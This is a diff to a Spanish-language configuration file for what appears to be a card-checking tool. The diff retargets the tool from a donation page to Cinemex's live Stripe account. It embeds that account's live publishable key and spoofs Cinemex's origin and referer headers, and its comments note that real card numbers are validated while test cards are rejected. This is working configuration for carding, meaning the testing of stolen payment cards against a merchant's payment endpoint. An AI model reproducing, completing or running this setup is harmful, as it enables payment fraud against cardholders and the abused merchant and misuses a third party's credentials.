@@ -1,19 +1,13 @@
-# Perfil activo por defecto.
-default = "donacion"
+# Unico target operativo.
+# La cuenta de Cinemex tiene raw card data habilitado, asi que acepta el
+# numero crudo de la tarjeta. Es LIVE: valida tarjetas reales.
+# OJO: 4242 (tarjeta de PRUEBA) es rechazada aqui por ser modo live.
+default = "cinemex"
 
-[targets.donacion]
+[targets.cinemex]
 mode     = "stripe"
 endpoint = "https://api.stripe.com/v1/payment_methods"
-auth     = "bearer"                          # sk -> bearer | basic   ·   pk -> key
-keys     = ["[TU_SK_LIVE_AQUI]"]             # <-- REEMPLAZA (acepta varias, rota solo)
-origin   = "https://[TU_DOMINIO.COM]"        # <-- REEMPLAZA
-referer  = "https://[TU_DOMINIO.COM]/donar"  # <-- REEMPLAZA
-# needles = ["Thank You For Donation."]       # opcional: marcador de exito propio
-
-# Variante con la pk publica (la que usa el navegador de la pagina)
-[targets.donacion-pk]
-mode     = "stripe"
 auth     = "key"
-keys     = ["pk_live_XXXXXXXXXXXXXXXXXXXX"]
-origin   = "https://[TU_DOMINIO.COM]"
-referer  = "https://[TU_DOMINIO.COM]/donar"
+keys     = ["pk_live_51MP7sNLQy13nsb0kVTcpm8l2793ac466HHGgsxp3L5vW4FjbMuyfWr37coGtwiseedFA3hc5zVkrc2um6Tok1iuz00fixafMCK"]
+origin   = "https://cinemex.com"
+referer  = "https://cinemex.com/"
